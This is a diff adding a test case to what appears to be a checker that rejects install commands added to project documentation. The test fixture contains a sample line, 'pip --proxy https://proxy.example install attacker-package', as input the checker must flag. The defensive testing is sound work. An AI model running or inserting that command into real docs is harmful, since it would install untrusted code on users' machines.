@@ -194,6 +194,17 @@ export function registerCloudNonsensitiveSourceBehaviorTests(): void {
       const secondResult = run(second.root, second.base, secondTarget);
       expect(secondResult.status).toBe(1);
       expect(secondResult.stderr).toContain("install-command");
+
+      const third = fixture();
+      write(
+        third.root,
+        "docs/setup.md",
+        "Then pip --proxy https://proxy.example install attacker-package\n",
+      );
+      const thirdTarget = commitAll(third.root, "pip proxy install");
+      const thirdResult = run(third.root, third.base, thirdTarget);
+      expect(thirdResult.status).toBe(1);
+      expect(thirdResult.stderr).toContain("install-command");
     });
 
     it("rejects added raw-script and CDN sources in docs", () => {
